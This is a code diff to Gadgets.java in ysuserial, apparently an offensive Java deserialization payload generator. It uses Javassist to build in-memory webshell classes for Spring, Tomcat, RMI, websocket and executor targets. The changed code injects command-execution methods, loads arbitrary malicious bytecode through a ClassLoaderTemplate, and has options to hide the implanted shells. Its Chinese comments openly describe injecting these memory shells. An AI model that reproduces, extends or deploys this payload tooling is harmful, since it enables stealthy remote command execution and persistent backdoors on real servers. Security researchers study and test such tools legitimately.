@@ -195,35 +195,7 @@ public class Gadgets {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
 
-			if (className.contains("Spring")) {
-
-				if (IS_INHERIT_ABSTRACT_TRANSLET) {
-					ctClass.setSuperclass(superClass);
-				}
-
-				// 如果是打入 Spring Interceptor 类型的内存马，则修改 SpringInterceptorTemplate 创建类字节码，并写入 SpringInterceptorMS 中
-				if (className.contains("SpringInterceptorMS")) {
-					String  target              = "org.su18.ysuserial.payloads.templates.memshell.spring.SpringInterceptorTemplate";
-					CtClass springTemplateClass = pool.get(target);
-					springTemplateClass.setName(newClassName);
-					String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
-
-					// 修改b64字节码及类名
-					String b64content = "b64=\"" + encode + "\";";
-					ctClass.makeClassInitializer().insertBefore(b64content);
-					String clazzNameContent = "clazzName=\"" + newClassName + "\";";
-					ctClass.makeClassInitializer().insertBefore(clazzNameContent);
-
-					// 修改类名
-					ctClass.setName(generateClassName());
-					classBytes = ctClass.toBytecode();
-					// 如果是打入 Spring Controller 类型的内存马
-				} else if (className.contains("SpringControllerMS")) {
-					ctClass.setName(newClassName);
-					classBytes = ctClass.toBytecode();
-				}
-
-			} else if (className.contains("RMIBindTemplate")) {
+			if (className.contains("RMIBindTemplate")) {
 				// 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法
 
 				if (IS_INHERIT_ABSTRACT_TRANSLET) {
@@ -251,60 +223,30 @@ public class Gadgets {
 				insertCMD(ctClass);
 				ctClass.addMethod(CtMethod.make("public String getDefaultDomain(javax.security.auth.Subject subject) throws java.io.IOException {return new String(execCmd(((java.security.Principal)subject.getPrincipals().iterator().next()).getName()).toByteArray());}", ctClass));
 
-				ctClass.setName(newClassName);
-				classBytes = ctClass.toBytecode();
 			} else {
-
-				// 配置恶意类不继承 AbstractTranslet 时，无需使用 ClassLoaderTemplate 进行封装
-				// 否则在恶意类自身存在父类时，无法继承 AbstractTranslet，需要使用 ClassLoaderTemplate 进行封装
-
-				// websocket/executor 型内存马，使用 ClassLoaderTemplate 加载
 				if (className.contains("WSMS")) {
 					insertKeyMethod(ctClass, "ws");
-
-					if (IS_INHERIT_ABSTRACT_TRANSLET) {
-						bytes = ctClass.toBytecode();
-						cName = ctClass.getName();
-					}
-
 				} else if (className.contains("UGMS")) {
 					insertKeyMethod(ctClass, "upgrade");
-
-					if (IS_INHERIT_ABSTRACT_TRANSLET) {
-						ctClass.setSuperclass(superClass);
-					}
-
 				} else if (className.contains("EXMS")) {
 					insertKeyMethod(ctClass, "execute");
-
-					if (IS_INHERIT_ABSTRACT_TRANSLET) {
-						bytes = ctClass.toBytecode();
-						cName = ctClass.getName();
-					}
-
-					// 内存马指定类型进行写入恶意逻辑
 				} else if (!Objects.equals(cName, "")) {
-
-					if (IS_INHERIT_ABSTRACT_TRANSLET) {
-						ctClass.setSuperclass(superClass);
-					}
-
 					insertKeyMethod(ctClass, cName);
-				} else {
-					if (IS_INHERIT_ABSTRACT_TRANSLET) {
-						ctClass.setSuperclass(superClass);
-					}
 				}
-
-				// 写出和加载测试
-//				writeClassToFile(cName, bytes);
-//				loadClassTest(bytes, cName);
-
-
-				ctClass.setName(newClassName);
-				classBytes = ctClass.toBytecode();
 			}
+
+			ctClass.setName(newClassName);
+
+			// 如果指定继承 AbstractTranslet，统一由 ClassLoaderTemplate 加载
+			// 不搞那么麻烦写 if else 了，有长度需求自己再改吧
+			if (IS_INHERIT_ABSTRACT_TRANSLET) {
+				bytes = ctClass.toBytecode();
+				cName = ctClass.getName();
+			}
+
+			classBytes = ctClass.toBytecode();
 		}
+
 		// 如果 bytes 不为空，则使用 ClassLoaderTemplate 加载任意恶意类字节码
 		if (bytes != null) {
 			ctClass = pool.get("org.su18.ysuserial.payloads.templates.ClassLoaderTemplate");
@@ -323,9 +265,7 @@ public class Gadgets {
 			}
 
 			classBytes = ctClass.toBytecode();
-
 		}
-
 
 		if (HIDE_MEMORY_SHELL) {
 			switch (HIDE_MEMORY_SHELL_TYPE) {
@@ -403,7 +343,9 @@ public class Gadgets {
 		// 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
 		String name = ctClass.getName();
 		name = name.substring(name.lastIndexOf(".") + 1);
-		boolean isTomcat = name.startsWith("T");
+
+		// 大多数 SpringBoot 项目使用内置 Tomcat
+		boolean isTomcat = name.startsWith("T") || name.startsWith("Spring");
 
 		// 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
 		String method = "";
@@ -497,7 +439,7 @@ public class Gadgets {
 	public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
 		// 根据传入的不同参数，在不同方法中插入不同的逻辑
 		CtMethod cm = ctClass.getDeclaredMethod(method);
-		cm.setBody(payload);
+		cm.insertBefore(payload);
 	}
 
 	/**
